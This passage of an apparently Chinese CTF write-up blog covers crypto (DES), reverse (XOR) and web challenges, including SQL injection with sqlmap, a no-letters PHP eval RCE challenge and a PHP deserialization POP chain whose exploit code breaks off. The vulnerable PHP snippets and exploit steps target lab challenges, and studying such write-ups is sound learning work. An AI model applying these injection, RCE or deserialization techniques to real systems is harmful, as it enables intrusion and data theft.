class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">     <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">     <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>],</span><br><span class="line">]</span><br><span class="line">__p = [</span><br><span class="line">    <span class="number">15</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">27</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>,</span><br><span class="line">    <span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="number">23</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">24</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EP</span>(<span class="params">data: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):  <span class="comment"># 扩展置换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: data[x], __expansion_table))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">data: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):  <span class="comment"># P置换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: data[x], __p))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F</span>(<span class="params">index: <span class="built_in">int</span>, R: <span class="built_in">list</span>[<span class="built_in">int</span>], skeys: <span class="built_in">list</span>[<span class="built_in">list</span>[<span class="built_in">int</span>]]</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    index: 代表这是第几轮</span></span><br><span class="line"><span class="string">    R: 输入数据</span></span><br><span class="line"><span class="string">    skeys: 子密钥数组</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    R = EP(R)  <span class="comment"># 扩展置换</span></span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, skeys[index]))  <span class="comment"># 异或</span></span><br><span class="line"></span><br><span class="line">    B = [R[:<span class="number">6</span>], R[<span class="number">6</span>:<span class="number">12</span>], R[<span class="number">12</span>:<span class="number">18</span>], R[<span class="number">18</span>:<span class="number">24</span>], R[<span class="number">24</span>:<span class="number">30</span>], R[<span class="number">30</span>:<span class="number">36</span>], R[<span class="number">36</span>:<span class="number">42</span>], R[<span class="number">42</span>:]]  <span class="comment"># 分成八份</span></span><br><span class="line"></span><br><span class="line">    Bn = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="comment">#  计算该使用S盒的行坐标和列坐标</span></span><br><span class="line">        row = (B[i][<span class="number">0</span>] &lt;&lt; <span class="number">1</span>) + B[i][<span class="number">5</span>]</span><br><span class="line">        col = (B[i][<span class="number">1</span>] &lt;&lt; <span class="number">3</span>) + (B[i][<span class="number">2</span>] &lt;&lt; <span class="number">2</span>) + (B[i][<span class="number">3</span>] &lt;&lt; <span class="number">1</span>) + B[i][<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">        sb = __sbox[i][(row &lt;&lt; <span class="number">4</span>) + col]</span><br><span class="line"></span><br><span class="line">        Bn[pos + <span class="number">0</span>] = (sb &amp; <span class="number">8</span>) &gt;&gt; <span class="number">3</span>  <span class="comment"># 四位输出</span></span><br><span class="line">        Bn[pos + <span class="number">1</span>] = (sb &amp; <span class="number">4</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">        Bn[pos + <span class="number">2</span>] = (sb &amp; <span class="number">2</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">        Bn[pos + <span class="number">3</span>] = (sb &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        pos += <span class="number">4</span></span><br><span class="line">    R = P(Bn)</span><br><span class="line">    <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_FP = [</span><br><span class="line">    <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">    <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">    <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">    <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">    <span class="number">32</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FP</span>(<span class="params">plain: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: plain[x], _FP))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plain = <span class="string">b&#x27;********&#x27;</span></span><br><span class="line">flag = <span class="string">b&#x27;HXCTF&#123;%s&#125;&#x27;</span> % (plain)</span><br><span class="line">key = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转为二进制数组</span></span><br><span class="line">key = reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> key])</span><br><span class="line">plain = reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> plain])</span><br><span class="line">skeys = get_sub_key(key)</span><br><span class="line"></span><br><span class="line">block = IP(plain)</span><br><span class="line"></span><br><span class="line">L, R = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    tpR = R[:]</span><br><span class="line">    R = F(i, R, skeys)</span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, L))</span><br><span class="line">    L = tpR</span><br><span class="line">block = R + L</span><br><span class="line">block = FP(block)</span><br><span class="line">enc = <span class="built_in">bytes</span>([<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, block[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>])), <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)  <span class="comment"># b&#x27;&#125;\n&lt;\xf5\xc8Q\x1cH&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x12\xe9\xd2\xdf\x9bp\x1c\x99&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert key to binary array</span></span><br><span class="line">key = reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> key])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate subkeys</span></span><br><span class="line">skeys = get_sub_key(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert ciphertext to binary array</span></span><br><span class="line">ciphertext = reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apply initial permutation</span></span><br><span class="line">block = IP(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Split block into two halves</span></span><br><span class="line">L, R = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt rounds</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    tpR = R[:]</span><br><span class="line">    R = F(<span class="number">15</span> - i, R, skeys)  <span class="comment"># Note: Using subkeys in reverse order</span></span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, L))</span><br><span class="line">    L = tpR</span><br><span class="line"></span><br><span class="line"><span class="comment"># Swap L and R before final permutation</span></span><br><span class="line">block = R + L</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apply final permutation</span></span><br><span class="line">block = FP(block)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert binary array back to bytes</span></span><br><span class="line">plaintext = <span class="built_in">bytes</span>([<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, block[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>])), <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)  <span class="comment"># Output the decrypted plaintext</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Reverse">Reverse</h2><p>好了,又是个边写边学的过程~</p><blockquote><h4 id="happy-assebly">happy_assebly</h4></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; void __cdecl enc(char *p)</span><br><span class="line">.text:00401160 _enc            proc near               ; CODE XREF: _main+1B↑p</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160 i               = dword ptr -4</span><br><span class="line">.text:00401160 Str             = dword ptr  8</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160                 push    ebp</span><br><span class="line">.text:00401161                 mov     ebp, esp</span><br><span class="line">.text:00401163                 push    ecx</span><br><span class="line">.text:00401164                 mov     [ebp+i], 0</span><br><span class="line">.text:0040116B                 jmp     short loc_401176</span><br><span class="line">.text:0040116D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040116D</span><br><span class="line">.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3B↓j</span><br><span class="line">.text:0040116D                 mov     eax, [ebp+i]</span><br><span class="line">.text:00401170                 add     eax, 1</span><br><span class="line">.text:00401173                 mov     [ebp+i], eax</span><br><span class="line">.text:00401176</span><br><span class="line">.text:00401176 loc_401176:                             ; CODE XREF: _enc+B↑j</span><br><span class="line">.text:00401176                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401179                 push    ecx             ; Str</span><br><span class="line">.text:0040117A                 call    _strlen</span><br><span class="line">.text:0040117F                 add     esp, 4</span><br><span class="line">.text:00401182                 cmp     [ebp+i], eax</span><br><span class="line">.text:00401185                 jge     short loc_40119D</span><br><span class="line">.text:00401187                 mov     edx, [ebp+Str]</span><br><span class="line">.text:0040118A                 add     edx, [ebp+i]</span><br><span class="line">.text:0040118D                 movsx   eax, byte ptr [edx]</span><br><span class="line">.text:00401190                 xor     eax, 57h</span><br><span class="line">.text:00401193                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401196                 add     ecx, [ebp+i]</span><br><span class="line">.text:00401199                 mov     [ecx], al</span><br><span class="line">.text:0040119B                 jmp     short loc_40116D</span><br><span class="line">.text:0040119D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040119D</span><br><span class="line">.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25↑j</span><br><span class="line">.text:0040119D                 mov     esp, ebp</span><br><span class="line">.text:0040119F                 pop     ebp</span><br><span class="line">.text:004011A0                 retn</span><br><span class="line">.text:004011A0 _enc            endp</span><br><span class="line">Input: your flag</span><br><span class="line">Encrypted result:0x1f, 0x0f, 0x14, 0x03, 0x11, 0x2c, 0x00, 0x32, 0x3b, 0x34, 0x38, 0x3a, 0x32, 0x08, 0x23, 0x38, 0x08, 0x03, 0x3f, 0x32, 0x08, 0x16, 0x04, 0x04, 0x12, 0x1a, 0x15, 0x1b, 0x0e, 0x08, 0x00, 0x18, 0x05, 0x1b, 0x13, 0x76, 0x2a</span><br></pre></td></tr></table></figure><p>看完之后也就是个异或操作,你知道这个这题就可以了.最后给了个加密的结果,那我们再逆回去就是了.直接异或操作即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">char</span> *p)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (*p != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        *p = *p ^ <span class="number">0x57</span>;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><hr><h2 id="Web">Web</h2><p>emmm,这个方向算是研究过的,终于不是陌生的了~Oh,yeah</p><p><s>只不过时间还是略显匆忙,最近事情太多了,没很多时间打这个比赛了,基本瞄一眼就过了,不会的也不想费太多时间,因为还有作业和考试,悲催</s></p><p>好波,Let’s begin!</p><blockquote><h4 id="贪吃🐍">贪吃🐍</h4></blockquote><p>题目给的提示;<strong>好玩的🐍🐍，你能吃到10000分吗</strong></p><p>一般这种题目就是js源码分析,真要玩的10000分解出的flag那我佩服你是游戏天才(或者非人类!)</p><p>开题先别管游戏规则,老规矩F12看看先!</p><p>先f搜索一下关键词,alert,没错发现好东西了</p><p><img src="https://s1.vika.cn/space/2024/05/10/fb4ca83a9a394e0cabf3c738927062f5" alt=""></p><p>再搜这个函数</p><p><img src="https://s1.vika.cn/space/2024/05/10/ed4f28419de442599eeb4aedcd3d2723" alt=""></p><p>明眼人都看得出是base64吧,拿去解密即可!</p><p>OK,不到30s一血就拿下了呗</p><blockquote><h4 id="sqlinject">sqlinject</h4></blockquote><p><strong>你能登录嘛？</strong></p><p>题目给的提示: <s>用sqlmap是没有灵魂的</s></p><p>纯误导提示我只能说是:当然你说反向提示你也行~</p><p>开题页面</p><p><img src="https://s1.vika.cn/space/2024/05/10/9bd0b6fbea0d4ffaad98e62bd2f367c8" alt=""></p><p>就两个地方可以有机会吧.当然登陆框你可以去试试,我是用的字典跑了两轮的,应该不可能有注入点</p><p>这条路走不通那只能换另外一个news入手了</p><p><img src="https://s1.vika.cn/space/2024/05/10/d1d917e835054d8389ee5ec0a2169770" alt=""></p><p>返回的是json格式,但是你仔细观察一下url,发现存在id=XXX的情况,ok,这不就是教材上经典的sql注入题型嘛.</p><p>先不急,手工验证一下,先上字典判断哪种注入类型.</p><p><img src="https://s1.vika.cn/space/2024/05/10/7740300643ca4518ad3eefa4c678b070" alt=""></p><p>发现也就是很普通的sql注入类型,应该也是没有过滤的,因此直接上sqlmap就行.</p><p>接下来就是sqlmap一把梭哈了</p><p>脱库后基本的常识你要知道,这个密码一般都不是提供具体的原密码保存在服务器的,而是hash过的hash值,当然sqlmap也会提示你</p><p>以后渗透测试时不要发蒙!这个地方还原的很经典,点赞一下出题人~,当然不要轻易用sqlmap去脱库哦,可能会很刑!</p><p><img src="https://s1.vika.cn/space/2024/05/10/64cd71c47d104078bb50f07b0eb2969c" alt=""></p><p>上面那个貌似是个假的库,用admin的密码登不上,反正一个个表验证就行了</p><p>最后得出是下面这个密码有效,再回到原来login页面登陆即可拿到flag!</p><p><img src="https://s1.vika.cn/space/2024/05/10/fbe24020c62b42d8abecfcf2b90b1390" alt=""></p><blockquote><h4 id="http">http</h4></blockquote><p>开题页面</p><p><img src="https://s1.vika.cn/space/2024/05/10/2afecd31e20e45bf82fdfece3e778ae5" alt=""></p><p>经典入门改数据包,很好奇这题为啥不放第一天(sql那个题应该可以跟这个换一下的我觉得)</p><p>BP启动吧还是,实在不会你可以csdn搜一下类似的改头的手法.当然这里有个坑</p><p>第五个条件是要你改IP,一般就是XFF头就够了~</p><p>但是这里出题的恶心你一手,改XFF应该是不够的,他不会让你过</p><p>这时候需要BP的一个插件<code>fakeIP</code><a href="https://blog.csdn.net/weixin_44203158/article/details/107234784">详情看</a></p><p>有插件应该就很好伪造了~</p><blockquote><h4 id="easy-rce">easy_rce</h4></blockquote><p>开题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你不准玩原神&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>emmm这好像是个原题吧,只能说一点意思没有,一模一样啥都不改</p><p><a href="https://www.cnblogs.com/pursue-security/p/15404150.html">这个blog对无字母产生讲的很清楚了,一些脚本你也可以自己编写或者思考变形,再具体的后面免杀的时候有用!</a></p><p>异或绕过或者取反应该都行(<code>根据那个正则应该就是不能出现平常的字符,因此这个手法也叫无字母rce</code>)</p><p>具体更多的php 的一些rce手法可以看我自己的blog总结<a href="https://www.eviden.top/2024/03/07/2024-03-07-RCE%E7%BB%95%E8%BF%87%E5%90%84%E7%A7%8D%E9%AA%9A/">Eviden’s Blog</a></p><p>打不开建议用魔法访问,页面托管在国外平台,国内DNS大部分被污染了,有点慢或者无法访问都是正常~</p><blockquote><h4 id="easy-pop">easy_pop</h4></blockquote><p>题目提示;简单反序列化</p><p>那就按他说的简单的反序列化来呗~</p><p>开题:</p><p>这是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__File__);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rank1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r1a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r1b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;r1a=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;r1b=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;r1a-&gt;&#123;<span class="variable language_">$this</span>-&gt;r1b&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rank2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r2a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;r2a-&gt;<span class="title function_ invoke__">GetFiag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rank3</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;r3a&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;r3b&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rank4</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r4a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;r4a=<span class="string">&#x27;hello,world&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r4a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;pass&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;pass&quot;</span>]:<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>!=<span class="literal">null</span>&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\x&#123;00&#125;/i&quot;</span>,<span class="variable">$pass</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pass</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们重点关注一些php的魔术方法:<code>__construct()</code>  <code>__destruct()</code> <code>__toString()</code> <code>__call($a,$b)</code></p><p>就这些了,不算多~具体触发手法你去搜一下,反序列化漏洞还是很重要的!</p><p>ok,开始代码审计</p><p>我们触发的顺序就是:3&lt;—1&lt;—2&lt;—4,反着推就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//3&lt;---1&lt;---2&lt;---4</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rank3</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;admin =<span 